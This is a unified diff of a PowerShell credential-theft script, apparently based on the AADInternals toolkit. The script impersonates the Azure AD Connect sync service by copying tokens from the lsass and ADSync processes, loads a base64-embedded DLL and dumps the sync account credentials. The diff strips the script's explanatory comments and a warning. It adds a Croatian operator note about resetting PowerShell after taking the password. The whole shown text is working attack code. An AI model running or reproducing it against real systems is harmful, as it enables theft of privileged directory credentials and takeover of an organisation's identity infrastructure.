@@ -9,21 +9,21 @@ function Check-Server
     )
     process
     {
-        # Check that we are on AADConnect server and that the service is running
+      
         if($force -ne $true -and (($adSyncService = Get-Service ADSync -ErrorAction SilentlyContinue) -eq $null -or $adSyncService.Status -ne "Running"))
         {
             Write-Error "This command needs to be run on a computer with ADSync running!"
             return $false
         }
 
-        # Add the encryption reference (should always be there)
+       
         $ADSyncLocation = (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\AD Sync").Location
         Add-Type -path "$ADSyncLocation\Bin\mcrypt.dll"
 
         $ADSyncUser=""
         $CurrentUser = "{0}\{1}" -f $env:USERDOMAIN,$env:USERNAME
 
-        # Check the version number: since 1.4.xx.xx uses DPAPI instead of registry to store the keyset
+        
         try
         {
             $serviceWMI = Get-WmiObject Win32_Service -Filter "Name='ADSync'" -ErrorAction SilentlyContinue
@@ -44,18 +44,16 @@ function Check-Server
             $AsADSync = $false
         }
 
-        # Elevate the current thread by copying the token from ADSync service
+        
         if($AsADSync)
         {
-            # First we need to get connection once to the DB to get token. 
-            # If done after "elevating" to ADSync, all SQL connections to configuration database will fail.
+            
             $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList (Get-AADConfigDbConnection)
             $SQLclient.Open()
             $SQLclient.Close()
             try
             {
-                # Copy the tokens from lsass and miiserver (ADSync) processes
-                Write-Verbose "Trying to ""elevate"" by copying token from lsass and then miiserver (ADSync) processes"
+                
                 $elevation = [AADInternals.Native]::copyLsassToken() -and [AADInternals.Native]::copyADSyncToken()
             }
             catch
@@ -66,7 +64,7 @@ function Check-Server
             if($elevation)
             {
                 Write-Verbose """Elevation"" to ADSync succeeded!"
-                #Write-Warning "Running as ADSync ($ADSyncUser). You MUST restart PowerShell to restore $CurrentUser rights."
+                
             }
             else
             {
@@ -105,7 +103,7 @@ function Get-SyncCredentials
                 $pinfo.RedirectStandardOutput = $true
                 $pinfo.UseShellExecute = $false
                 $pinfo.CreateNoWindow = $true
-                $pinfo.WorkingDirectory = $PSScriptRoot
+                
                
                 $p = New-Object System.Diagnostics.Process
                 $p.StartInfo = $pinfo
@@ -267,3 +265,4 @@ $DLLBytes = [System.Convert]::FromBase64String($base64dll)
 
 $credentials = Get-SyncCredentials -AsBackgroundProcess $false
 return $credentials | Format-List
+Write-Verbose "Powershell tokeni ne stimaju resetiraj powershell nakon uzimanja pw-a"
